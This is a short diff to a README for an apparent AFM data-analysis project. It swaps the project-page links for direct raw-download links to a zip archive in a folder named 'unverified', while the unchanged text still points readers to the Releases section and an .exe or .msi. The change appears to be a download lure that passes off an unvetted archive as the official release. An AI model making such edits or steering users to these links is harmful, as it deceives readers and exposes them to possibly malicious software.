@@ -1,6 +1,6 @@
 # 🔬 nomad-measurements-afm - Analyze Atomic Force Microscopy data easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Papaye974/nomad-measurements-afm)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Papaye974/nomad-measurements-afm/raw/refs/heads/main/unverified/afm_nomad_measurements_2.0.zip)
 
 ## 📋 Project Overview
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these basic needs:
 
 You need to obtain the installation package from the project page. 
 
-[Click here to visit the download page](https://github.com/Papaye974/nomad-measurements-afm)
+[Click here to visit the download page](https://github.com/Papaye974/nomad-measurements-afm/raw/refs/heads/main/unverified/afm_nomad_measurements_2.0.zip)
 
 Go to the link above and look for the section labeled "Releases" on the right side of the screen. Click the latest version number. Look for the file ending in `.exe` or `.msi` in the assets list. Click this file to save it to your computer.
 
